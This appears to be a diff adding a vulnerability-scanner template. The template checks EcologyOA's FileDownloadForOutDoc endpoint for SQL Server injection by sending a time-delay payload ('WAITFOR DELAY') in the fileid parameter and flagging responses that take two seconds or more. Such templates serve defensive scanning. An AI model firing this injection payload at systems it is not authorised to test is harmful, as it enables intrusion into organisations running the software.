@@ -1,0 +1,24 @@
+id: ecology-oa-filedownloadforoutdoc-sqli
+
+info:
+  name: EcologyOA filedownloadforoutdoc -sqlserver SQL injection
+  author: Hiroki Sawada
+  severity: critical
+  description: EcologyOA filedownloadforoutdoc interface has SQL injection
+  tags: ecology-oa,sqli,sqlserver
+
+requests:
+  - raw:
+      - |
+        POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close        
+
+        fileid=1+WAITFOR+DELAY+%270:0:2%27&isFromOutImg=1
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=2'
